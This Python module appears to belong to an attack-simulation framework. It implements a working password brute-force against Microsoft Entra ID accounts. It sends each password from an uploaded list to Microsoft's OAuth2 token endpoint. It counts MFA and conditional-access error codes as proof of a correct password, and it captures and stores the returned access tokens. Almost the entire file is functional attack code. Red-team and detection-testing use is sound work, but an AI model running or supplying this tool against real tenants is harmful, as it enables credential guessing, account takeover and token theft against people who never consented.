from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.entra_token_manager import EntraTokenManager
import requests
import base64
import time

@TechniqueRegistry.register
class EntraBruteforcePassword(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1110.001",
                technique_name="Brute Force",
                tactics=["Credential Access", "Initial Access"],
                sub_technique_name="Password Guessing"
            )
        ]
        super().__init__("Bruteforce Password", "Executes bruteforce attack by attempting to authenticate over graph api with a username & list of passwords.", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)

        try:
            username: str = kwargs.get('username', None)
            password_file: str = kwargs.get('password_file', None)
            client_id: str = kwargs.get('client_id', 'd3590ed6-52b3-4102-aeff-aad2292ab01c')
            wait: str = kwargs.get('wait', 3)
            save_token: bool = kwargs.get('save_tokens', False)
            set_as_active_token: bool = kwargs.get('set_as_active_token', False)
            
            if username in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": {"Error" : "Invalid Technique Input"},
                    "message": {"Error" : "Invalid Technique Input"}
                }

            if password_file in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": {"Error" : "Invalid Technique Input"},
                    "message": {"Error" : "Invalid Technique Input"}
                }
            
            if client_id in [None, ""]:
                client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c" # set default client ID
            if wait in [None, ""]:
                wait = 3 # set default wait time

            endpoint_url = "https://login.microsoft.com/common/oauth2/token"
            resource = "https://graph.microsoft.com"
            scope = ['openid']
            
            headers = {
                "Accept" : "application/json",
                "Content-Type" : "application/x-www-form-urlencoded"
            }

            # extract passwords from text file
            content_string = password_file.split(',')[-1]
            decoded = base64.b64decode(content_string)
            try:
                text = decoded.decode('utf-8')
                passwords_list = text.split('\n')
            except:
                return {"Error" : "Failed to read password file"}

            attempts_count = 0
            output = {}
            # start bruteforce
            for password in passwords_list:
                data = {
                    "grant_type": "password",
                    "password" : password,
                    "client_id" : client_id,
                    "username" : username,
                    "resource" : resource,
                    "scope" : ' '.join(scope)
                }

                # increment attempt counter
                attempts_count += 1

                # request access token
                try:
                    raw_response = requests.post(url = endpoint_url, headers = headers, data = data)
                    
                    if 200 <= raw_response.status_code < 300:
                        access_token = raw_response.json().get('access_token')
                        if save_token:
                            # save token to app
                            EntraTokenManager().add_token(access_token)
                            if set_as_active_token:
                                # set as active token to use
                                EntraTokenManager().set_active_token(access_token)
                        return ExecutionStatus.SUCCESS, {
                            "message": f"Successfully found password",
                            "value": {
                                'username' : username,
                                'password_matched' : password,
                                "access_token" : access_token,
                                "token_saved" : save_token,
                                "token_active" : set_as_active_token,
                                "additional_info" : {"total_passwords" : len(passwords_list), "attempted_passwords" : attempts_count}
                            }
                        }

                    # check for error codes that indicate correct password but auth failed due to other reasons
                    elif any(e_code in [50076,50072, 50074, 50005, 50131] for e_code in raw_response.json().get('error_codes')):
                        return ExecutionStatus.SUCCESS, {
                            "message": f"Successfully found password",
                            "value": {
                                "username" : username,
                                "password_matched" : password,
                                "access_token" : None,
                                "additional_info" : {"error_code" : raw_response.json().get('error_codes', 'N/A'), "error":raw_response.json().get('error', 'N/A'), "error_description" : raw_response.json().get('error_description', 'N/A')}
                            }
                        }
                    else:
                        # wait before next attempt
                        time.sleep(wait)
                except:
                    # wait before next attempt
                    time.sleep(wait)
            
            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully completed bruteforce. No password found.",
                "value": {
                    "username" : username,
                    "password_matched" : None,
                    "access_token" : None,
                    "attempted_passwords" : len(passwords_list)
                }
            }
        
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to execute password bruteforce"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "username": {"type": "str", "required": True, "default":None, "name": "Username", "input_field_type" : "text"},  
            "password_file": {"type": "str", "required": True, "default":None, "name": "Password List File", "input_field_type" : "upload"},
            "client_id": {"type": "str", "required": False, "default": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "name": "MS Graph Client ID", "input_field_type" : "text"},
            "wait": {"type": "int", "required": False, "default":3, "name": "Wait Between Attempts", "input_field_type" : "number"},
            "save_token": {"type": "bool", "required": False, "default":False, "name": "Save Token to App?", "input_field_type" : "bool"},
            "set_as_active_token": {"type": "bool", "required": False, "default":False, "name": "Set as Active Token?", "input_field_type" : "bool"}
        }